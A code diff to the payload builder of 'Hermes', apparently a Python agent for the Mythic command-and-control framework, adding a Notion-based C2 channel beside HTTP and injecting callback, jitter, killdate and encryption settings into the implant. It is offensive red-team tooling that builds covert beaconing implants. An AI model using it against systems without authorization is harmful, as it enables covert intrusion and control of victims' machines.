@@ -21,7 +21,7 @@ Hermes - Agent Mythic C2 Linux-only, full Python.
 Messenger god. Requires Python 3.8+ and pip install cryptography on target.
 """
     supports_dynamic_loading = False
-    c2_profiles = ["http"]
+    c2_profiles = ["http", "notion"]
     build_parameters = [
         BuildParameter(
             name="output_type",
@@ -65,8 +65,9 @@ Messenger god. Requires Python 3.8+ and pip install cryptography on target.
             profile = c2.get_c2profile()
             build_stdout += f"[DEBUG] C2 profile detected: {profile.get('name', 'unknown')}\n"
             
-            if profile.get("name") != "http":
-                build_stderr += f"Hermes only supports the HTTP C2 profile. Detected profile: {profile.get('name', 'unknown')}\n"
+            profile_name = profile.get("name", "")
+            if profile_name not in ("http", "notion"):
+                build_stderr += f"Hermes supports http and notion C2 profiles. Detected: {profile_name}\n"
                 return BuildResponse(
                     status=BuildStatus.Error,
                     build_stdout=build_stdout,
@@ -74,197 +75,138 @@ Messenger god. Requires Python 3.8+ and pip install cryptography on target.
                 )
 
             params = c2.get_parameters_dict()
-            
-            # Extract callback_host
-            try:
-                callback_host_raw = params.get("callback_host")
-                if isinstance(callback_host_raw, dict):
-                    callback_host = callback_host_raw.get("value", "")
-                else:
-                    callback_host = str(callback_host_raw) if callback_host_raw else ""
-            except Exception as e:
-                build_stderr += f"Warning: Error extracting callback_host: {e}\n"
-                callback_host = ""
-            
-            # Check for dangerous default values
-            if not callback_host or callback_host in ["https://domain.com", "http://domain.com", "domain.com"]:
-                build_stderr += f"WARNING: callback_host is set to '{callback_host}' (default value).\n"
-                build_stderr += "Please configure the HTTP profile with your real address/IP.\n"
-                build_stderr += "Build will continue but the agent may not connect.\n\n"
-            
-            callback_host = callback_host or "http://127.0.0.1"
-            
-            # Extract callback_port
-            callback_port = 443
-            try:
-                if "callback_port" in params:
-                    v = params["callback_port"]
-                    if isinstance(v, dict):
-                        callback_port = int(v.get("value", 443))
-                    else:
-                        callback_port = int(v) if v else 443
-                elif "port" in params:
-                    v = params["port"]
-                    if isinstance(v, dict):
-                        callback_port = int(v.get("value", 443))
-                    else:
-                        callback_port = int(v) if v else 443
-            except (ValueError, TypeError) as e:
-                build_stderr += f"Warning: Error extracting port, using 443 by default: {e}\n"
-                callback_port = 443
 
-            # Extract post_uri
-            try:
-                post_uri_raw = params.get("post_uri")
-                if isinstance(post_uri_raw, dict):
-                    post_uri = post_uri_raw.get("value", "/api/v1.4/agent_message")
-                else:
-                    post_uri = str(post_uri_raw) if post_uri_raw else "/api/v1.4/agent_message"
-                # Ensure post_uri starts with /
-                if post_uri and not post_uri.startswith("/"):
-                    post_uri = "/" + post_uri
-            except Exception as e:
-                build_stderr += f"Warning: Error extracting post_uri: {e}\n"
-                post_uri = "/api/v1.4/agent_message"
+            # --- Common parameters (interval, jitter, killdate, crypto) ---
+            def _extract(p, key, default):
+                v = p.get(key, default)
+                return v.get("value", default) if isinstance(v, dict) else (v if v is not None else default)
 
-            # Extract headers
-            headers_raw = params.get("headers")
-            headers = {}
             try:
-                if isinstance(headers_raw, dict):
-                    if "value" in headers_raw:
-                        # headers can be a dict with "value" containing a dict or JSON string
-                        val = headers_raw.get("value")
-                        if isinstance(val, dict):
-                            headers = val
-                        elif isinstance(val, str):
-                            try:
-                                headers = json.loads(val)
-                            except json.JSONDecodeError:
-                                headers = {}
-                    else:
-                        # headers is a dict
-                        headers = headers_raw
-                elif isinstance(headers_raw, str):
-                    # headers is a JSON string
-                    try:
-                        headers = json.loads(headers_raw)
-                    except json.JSONDecodeError:
-                        headers = {}
-            except Exception as e:
-                build_stderr += f"Warning: Error extracting headers: {e}\n"
-                headers = {}
-            
-            headers_json = json.dumps(headers)
-
-            # Extract interval
-            try:
-                interval_raw = params.get("callback_interval")
-                if isinstance(interval_raw, dict):
-                    interval = int(interval_raw.get("value", 10))
-                else:
-                    interval = int(interval_raw or 10)
+                interval = int(_extract(params, "callback_interval", 10))
             except (ValueError, TypeError):
                 interval = 10
-            
-            # Extract jitter
+
             try:
-                jitter_raw = params.get("callback_jitter")
-                if isinstance(jitter_raw, dict):
-                    jitter = int(jitter_raw.get("value", 0))
-                else:
-                    jitter = int(jitter_raw or 0)
+                jitter = int(_extract(params, "callback_jitter", 0))
             except (ValueError, TypeError):
                 jitter = 0
-            
-            # Extract killdate
-            killdate = ""
-            try:
-                if "killdate" in params:
-                    v = params["killdate"]
-                    if isinstance(v, dict):
-                        killdate = v.get("value") or ""
-                    else:
-                        killdate = str(v) if v else ""
-            except Exception:
-                killdate = ""
 
-            # encrypted_exchange_check: False = use AESPSK (no EKE), True = staging_rsa
-            use_psk = False
-            try:
-                eec = params.get("encrypted_exchange_check")
-                if isinstance(eec, dict):
-                    val = eec.get("value", True)
-                    use_psk = val is False if isinstance(val, bool) else (str(val).lower() in ("false", "0", "f", "no"))
-                elif isinstance(eec, bool):
-                    use_psk = not eec
-                else:
-                    use_psk = str(eec).lower() in ("false", "0", "f", "no") if eec is not None else False
-            except Exception:
-                use_psk = False
+            killdate = str(_extract(params, "killdate", "") or "")
 
-            # AESPSK: pre-shared key (base64) when use_psk=True
+            eec_raw = _extract(params, "encrypted_exchange_check", True)
+            if isinstance(eec_raw, bool):
+                use_psk = not eec_raw
+            else:
+                use_psk = str(eec_raw).lower() in ("false", "0", "f", "no")
+
             aes_psk_b64 = ""
             if use_psk:
                 try:
                     raw = params.get("AESPSK")
                     if isinstance(raw, dict):
-                        if "enc_key" in raw and raw.get("enc_key"):
-                            aes_psk_b64 = str(raw["enc_key"]).strip()
-                        elif "value" in raw and isinstance(raw["value"], dict) and raw["value"].get("enc_key"):
-                            aes_psk_b64 = str(raw["value"]["enc_key"]).strip()
-                        elif "value" in raw and isinstance(raw["value"], str) and raw["value"].strip():
-                            aes_psk_b64 = str(raw["value"]).strip()
-                    elif isinstance(raw, str) and raw.strip():
+                        aes_psk_b64 = (
+                            str(raw.get("enc_key") or "").strip()
+                            or str((raw.get("value") or {}).get("enc_key") or "").strip()
+                            or str(raw.get("value") or "").strip()
+                        )
+                    elif isinstance(raw, str):
                         aes_psk_b64 = raw.strip()
                     if not aes_psk_b64:
-                        build_stderr += "AESPSK requested (encrypted_exchange_check=False) but AESPSK key missing or empty.\n"
+                        build_stderr += "AESPSK requested but key is missing or empty.\n"
                 except Exception as e:
                     build_stderr += f"AESPSK extraction error: {e}\n"
 
-            # Build base_url
-            try:
-                if "://" not in callback_host:
-                    callback_host = "https://" + callback_host
-                # Clean callback_host (remove port if already present)
-                if ":" in callback_host.split("://")[1]:
-                    # Port already present in callback_host
-                    base_url = callback_host.rstrip("/")
-                else:
-                    base_url = f"{callback_host.rstrip('/')}:{callback_port}"
-                if not base_url.endswith("/"):
-                    base_url += "/"
-            except Exception as e:
-                build_stderr += f"Warning: Error building base_url: {e}\n"
-                base_url = "http://127.0.0.1:80/"
-
-            build_stdout += "[+] Step 1: Gathering files...\n"
-            agent_src = self.agent_code_path / "agent.py"
-            if not agent_src.exists():
-                build_stderr += f"File not found: {agent_src}\n"
-                return BuildResponse(
-                    status=BuildStatus.Error,
-                    build_stdout=build_stdout,
-                    build_stderr=build_stderr,
-                )
-
-            content = agent_src.read_text(encoding="utf-8")
-            build_stdout += "[+] Step 2: Injecting config...\n"
-
-            # Replace placeholders - replace value between quotes
             import re
-            # UUID, BASE_URL, POST_URI, HEADERS_JSON, KILLDATE are JSON strings
-            content = re.sub(r'(CONFIG_UUID\s*=\s*)"[^"]*"', rf'\1{json.dumps(self.uuid)}', content, count=1)
-            content = re.sub(r'(CONFIG_BASE_URL\s*=\s*)"[^"]*"', rf'\1{json.dumps(base_url)}', content, count=1)
-            content = re.sub(r'(CONFIG_POST_URI\s*=\s*)"[^"]*"', rf'\1{json.dumps(post_uri)}', content, count=1)
-            # headers_json is already a JSON string, inject it directly
-            content = re.sub(r'(CONFIG_HEADERS_JSON\s*=\s*)"[^"]*"', rf'\1{json.dumps(headers_json)}', content, count=1)
-            # CONFIG_INTERVAL and CONFIG_JITTER must remain strings (converted to int in agent)
-            content = re.sub(r'(CONFIG_INTERVAL\s*=\s*)"[^"]*"', rf'\1"{interval}"', content, count=1)
-            content = re.sub(r'(CONFIG_JITTER\s*=\s*)"[^"]*"', rf'\1"{jitter}"', content, count=1)
-            content = re.sub(r'(CONFIG_KILLDATE\s*=\s*)"[^"]*"', rf'\1{json.dumps(killdate)}', content, count=1)
-            content = re.sub(r'(CONFIG_USE_PSK\s*=\s*)"[^"]*"', rf'\1"{str(use_psk).lower()}"', content, count=1)
-            content = re.sub(r'(CONFIG_AESPSK\s*=\s*)"[^"]*"', rf'\1{json.dumps(aes_psk_b64)}', content, count=1)
+
+            if profile_name == "http":
+                # --- HTTP profile ---
+                callback_host = str(_extract(params, "callback_host", "") or "")
+                if not callback_host or callback_host in ("https://domain.com", "http://domain.com", "domain.com"):
+                    build_stderr += f"WARNING: callback_host='{callback_host}' looks like a default. Agent may not connect.\n"
+                callback_host = callback_host or "http://127.0.0.1"
+
+                try:
+                    callback_port = int(_extract(params, "callback_port", _extract(params, "port", 443)))
+                except (ValueError, TypeError):
+                    callback_port = 443
+
+                post_uri = str(_extract(params, "post_uri", "/api/v1.4/agent_message") or "/api/v1.4/agent_message")
+                if not post_uri.startswith("/"):
+                    post_uri = "/" + post_uri
+
+                headers_raw = params.get("headers", {})
+                headers = {}
+                try:
+                    if isinstance(headers_raw, dict):
+                        val = headers_raw.get("value", headers_raw)
+                        headers = json.loads(val) if isinstance(val, str) else (val if isinstance(val, dict) else {})
+                    elif isinstance(headers_raw, str):
+                        headers = json.loads(headers_raw)
+                except Exception:
+                    headers = {}
+                headers_json = json.dumps(headers)
+
+                try:
+                    if "://" not in callback_host:
+                        callback_host = "https://" + callback_host
+                    host_part = callback_host.split("://")[1]
+                    base_url = callback_host.rstrip("/") if ":" in host_part else f"{callback_host.rstrip('/')}:{callback_port}"
+                    if not base_url.endswith("/"):
+                        base_url += "/"
+                except Exception as e:
+                    build_stderr += f"Warning: building base_url: {e}\n"
+                    base_url = "http://127.0.0.1:80/"
+
+                build_stdout += "[+] Step 1: Gathering files...\n"
+                agent_src = self.agent_code_path / "agent.http" / "agent.py"
+                req_path = self.agent_code_path / "agent.http" / "requirements.txt"
+                if not agent_src.exists():
+                    build_stderr += f"File not found: {agent_src}\n"
+                    return BuildResponse(status=BuildStatus.Error, build_stdout=build_stdout, build_stderr=build_stderr)
+
+                content = agent_src.read_text(encoding="utf-8")
+                build_stdout += "[+] Step 2: Injecting config (http)...\n"
+
+                content = re.sub(r'(CONFIG_UUID\s*=\s*)"[^"]*"', rf'\1{json.dumps(self.uuid)}', content, count=1)
+                content = re.sub(r'(CONFIG_BASE_URL\s*=\s*)"[^"]*"', rf'\1{json.dumps(base_url)}', content, count=1)
+                content = re.sub(r'(CONFIG_POST_URI\s*=\s*)"[^"]*"', rf'\1{json.dumps(post_uri)}', content, count=1)
+                content = re.sub(r'(CONFIG_HEADERS_JSON\s*=\s*)"[^"]*"', rf'\1{json.dumps(headers_json)}', content, count=1)
+                content = re.sub(r'(CONFIG_INTERVAL\s*=\s*)"[^"]*"', rf'\1"{interval}"', content, count=1)
+                content = re.sub(r'(CONFIG_JITTER\s*=\s*)"[^"]*"', rf'\1"{jitter}"', content, count=1)
+                content = re.sub(r'(CONFIG_KILLDATE\s*=\s*)"[^"]*"', rf'\1{json.dumps(killdate)}', content, count=1)
+                content = re.sub(r'(CONFIG_USE_PSK\s*=\s*)"[^"]*"', rf'\1"{str(use_psk).lower()}"', content, count=1)
+                content = re.sub(r'(CONFIG_AESPSK\s*=\s*)"[^"]*"', rf'\1{json.dumps(aes_psk_b64)}', content, count=1)
+
+            else:
+                # --- Notion profile ---
+                notion_token = str(_extract(params, "integration_token", "") or "")
+                notion_db_id = str(_extract(params, "database_id", "") or "")
+
+                if not notion_token:
+                    build_stderr += "ERROR: integration_token is required for the notion C2 profile.\n"
+                    return BuildResponse(status=BuildStatus.Error, build_stdout=build_stdout, build_stderr=build_stderr)
+                if not notion_db_id:
+                    build_stderr += "ERROR: database_id is required for the notion C2 profile.\n"
+                    return BuildResponse(status=BuildStatus.Error, build_stdout=build_stdout, build_stderr=build_stderr)
+
+                build_stdout += "[+] Step 1: Gathering files...\n"
+                agent_src = self.agent_code_path / "agent.notion" / "agent_notion.py"
+                req_path = self.agent_code_path / "agent.notion" / "requirements.txt"
+                if not agent_src.exists():
+                    build_stderr += f"File not found: {agent_src}\n"
+                    return BuildResponse(status=BuildStatus.Error, build_stdout=build_stdout, build_stderr=build_stderr)
+
+                content = agent_src.read_text(encoding="utf-8")
+                build_stdout += "[+] Step 2: Injecting config (notion)...\n"
+
+                content = re.sub(r'(CONFIG_UUID\s*=\s*)"[^"]*"', rf'\1{json.dumps(self.uuid)}', content, count=1)
+                content = re.sub(r'(CONFIG_NOTION_TOKEN\s*=\s*)"[^"]*"', rf'\1{json.dumps(notion_token)}', content, count=1)
+                content = re.sub(r'(CONFIG_NOTION_DB_ID\s*=\s*)"[^"]*"', rf'\1{json.dumps(notion_db_id)}', content, count=1)
+                content = re.sub(r'(CONFIG_INTERVAL\s*=\s*)"[^"]*"', rf'\1"{interval}"', content, count=1)
+                content = re.sub(r'(CONFIG_JITTER\s*=\s*)"[^"]*"', rf'\1"{jitter}"', content, count=1)
+                content = re.sub(r'(CONFIG_KILLDATE\s*=\s*)"[^"]*"', rf'\1{json.dumps(killdate)}', content, count=1)
+                content = re.sub(r'(CONFIG_USE_PSK\s*=\s*)"[^"]*"', rf'\1"{str(use_psk).lower()}"', content, count=1)
+                content = re.sub(r'(CONFIG_AESPSK\s*=\s*)"[^"]*"', rf'\1{json.dumps(aes_psk_b64)}', content, count=1)
 
             build_stdout += "[+] Step 3: Finalizing...\n"
             payload_bytes = content.encode("utf-8")
@@ -276,7 +218,7 @@ Messenger god. Requires Python 3.8+ and pip install cryptography on target.
                 buf = io.BytesIO()
                 with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
                     zf.writestr("agent.py", content)
-                    req = (self.agent_code_path / "requirements.txt").read_text(encoding="utf-8")
+                    req = req_path.read_text(encoding="utf-8")
                     zf.writestr("requirements.txt", req)
                 zip_bytes = buf.getvalue()
                 encoded_payload = base64.b64encode(zip_bytes).decode("ascii")
